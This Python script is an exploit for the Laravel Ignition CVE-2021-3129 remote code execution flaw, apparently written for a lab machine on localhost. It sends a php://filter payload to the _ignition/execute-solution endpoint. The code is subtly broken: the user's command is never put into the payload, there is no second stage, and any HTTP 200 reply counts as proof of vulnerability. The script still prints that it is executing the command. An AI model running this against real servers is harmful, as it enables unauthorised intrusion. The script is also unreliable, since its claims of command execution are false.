#!/usr/bin/env python3
"""
Machine 5 - Laravel Ignition CVE-2021-3129 RCE
Target: http://localhost:9051
Vulnerability: Remote Code Execution via Ignition debug mode
"""

import requests
import json
import sys

TARGET = "http://localhost:9051"

def exploit(cmd):
    """Exploit Laravel Ignition RCE via _ignition/execute-solution endpoint"""
    # CVE-2021-3129 payload
    payload = {
        "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
        "parameters": {
            "variableName": "username",
            "viewFile": f"php://filter/write=convert.base64-decode/resource=../storage/logs/laravel.log"
        }
    }
    
    try:
        # Target the Ignition endpoint
        response = requests.post(
            f"{TARGET}/_ignition/execute-solution",
            json=payload,
            headers={"Content-Type": "application/json"},
            timeout=10
        )
        
        if response.status_code == 200:
            return response.text
        else:
            # Try simulated endpoint
            return f"Response: {response.text[:300]}"
            
    except requests.RequestException as e:
        return f"Error: {e}"

def check_vulnerable():
    """Check if target is vulnerable"""
    try:
        response = requests.post(
            f"{TARGET}/_ignition/execute-solution",
            json={"solution": "test"},
            headers={"Content-Type": "application/json"},
            timeout=5
        )
        return "Executed" in response.text or response.status_code == 200
    except:
        return False

def main():
    print("[*] Machine 5 - Laravel Ignition CVE-2021-3129 RCE")
    print(f"[*] Target: {TARGET}")
    print("-" * 50)
    
    if len(sys.argv) > 1:
        cmd = " ".join(sys.argv[1:])
    else:
        cmd = "id"
    
    print(f"[+] Checking vulnerability...")
    
    if check_vulnerable():
        print("[+] Target appears vulnerable!")
        print(f"[+] Executing command: {cmd}")
        print("-" * 50)
        result = exploit(cmd)
        print(result)
    else:
        print("[-] Target may not be vulnerable or endpoint not accessible")

if __name__ == "__main__":
    main()
